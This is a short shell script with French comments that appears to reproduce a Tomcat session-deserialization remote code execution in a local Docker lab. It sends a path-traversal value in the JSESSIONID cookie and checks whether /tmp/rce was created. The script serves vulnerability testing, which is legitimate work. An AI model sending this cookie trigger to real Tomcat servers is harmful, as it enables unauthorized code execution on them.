#!/bin/sh

# On build puis lance le container avec le serveur tomcat
docker build -t tomcat:groovy .
docker run -d -p 8080:8080 tomcat:groovy
echo "\nAttente du lancement du serveur tomcat\n"
sleep 10

# Envoie de la requête
echo "Envoie de la requête malicieuse : \n"
curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'

#Vérification de la création de /tmp/rce 
var=$(docker container ls -q --filter "ancestor=tomcat:groovy")
echo "\n\nVérification de la création du fichier : "
docker exec -t -i $var /bin/ls "/tmp/rce"
echo "\nSuppression du container"
docker kill $var
docker rm  $var
